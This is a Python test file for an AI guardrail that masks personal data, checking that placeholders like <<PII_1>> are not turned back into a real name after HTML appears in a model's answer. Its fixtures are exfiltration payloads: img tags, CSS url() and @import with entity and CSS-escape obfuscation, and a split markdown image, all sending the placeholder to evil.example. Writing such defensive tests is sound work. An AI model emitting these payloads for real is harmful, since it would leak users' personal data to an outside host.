"""08-tam-1a r4 MAJOR-r4-1 (KARARLAR "C17 geri çevirme: cevap düzeyinde HTML fail-closed", A): after
the first HTML tag in an answer (`<` and a letter; the only exception is a whole placeholder
`<<PII_n>>`) no placeholder of the rest of that answer is reversed. The line model no longer tries
to follow HTML (tags, quotes, attribute values): every respelling of the r4 report is closed by the
class, not by a rule for it. Markdown keeps its line rule; a `\\r` that ends a stream piece does not
end the line (a CRLF split over two pieces is one line break)."""

import pytest

from tests.unit.test_08t_r3_url_rules import _read

NAME = "Ayşe Kaya"

R4 = [
    # (a) a quote that is no attribute quote; (a') a bare quote in the tag
    '<img alt=a"b src="https://evil.example/?x=>\n<<PII_1>>">',
    '<img "a src="https://evil.example/?x=>\n<<PII_1>>">',
    # (b) a markdown opener before the tag; (b') a <pre> block and a blank line
    '[a]( <img src="https://evil.example/?q=)\n<<PII_1>>">',
    '<pre>[a]( <img src="https://evil.example/?q=\n\n<<PII_1>>">',
    # (c) an element named like a placeholder, entity-encoded url( and scheme
    '<PII_1 style\n="background-image:&#117;rl(https&#58;&#47;&#47;evil.example/?q=<<PII_2>>)">',
    # (d) CSS escapes in a <style> block, and @import
    '<style>\nbody{background-image:\\75 rl("\\68ttps\\3a\\2f\\2f evil.example/?q=<<PII_1>>")}\n'
    "</style>",
    '<style>\n@import "\\68ttps\\3a\\2f\\2f evil.example/?q=<<PII_1>>";\n</style>',
    # an earlier line with a tag, a later plain line
    "<b>Not</b>\n\nSahibi <<PII_1>>",
    "a<b ve\nSahibi <<PII_1>>",
]


@pytest.mark.parametrize("form", ["text", "json", "stream", "console"])
@pytest.mark.parametrize("size", [1, 7, 50])
@pytest.mark.parametrize("text", R4)
def test_08t_r4_after_the_first_tag_nothing_is_reversed(text, form, size):
    out = _read(text.replace("<<PII_2>>", "<<PII_1>>"), form, size=size)
    assert NAME not in out


@pytest.mark.parametrize("form", ["stream", "console"])
def test_08t_r4_crlf_split_over_pieces_is_one_line_break(form):
    # (e): `![x](\r` | `\n//evil…<<PII_1>>)`: the split CRLF is no blank line, the markdown target
    # stays open into the next line
    from tests.unit.test_08t_c17_masking import _store_with

    store, _ = _store_with([NAME])
    pieces = ["![x](\r", "\n&#47;&#47;evil.example/?q=<<PII_1>>)"]

    import asyncio

    from ffcore.guardrails.masking import ContextReveal, StreamDetokenizer

    async def go():
        if form == "stream":
            sd = StreamDetokenizer(store, "run-1")
            out = [await sd.feed(p) for p in pieces]
            return "".join(out) + await sd.flush()
        cr = ContextReveal(store, "run-1")
        return "".join([(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces])

    assert NAME not in asyncio.run(go())


@pytest.mark.parametrize("form", ["text", "stream", "console"])
@pytest.mark.parametrize(
    "text",
    [
        "Sahibi <<PII_1>>.",
        "<<PII_1>> ve <<PII_1>>",  # a whole placeholder is no tag
        "Önce <<PII_1>>\n<b>sonra</b>",  # before the first tag
        "Not: a < b ve <<PII_1>>",
        "Bkz. ![x](//h/a.png)\n\nSahibi <<PII_1>>",  # markdown only: the line rule
    ],
)
def test_08t_r4_answers_without_html_before_it_are_reversed(text, form):
    out = _read(text, form, size=200)
    assert NAME in out.split("<b>")[0]
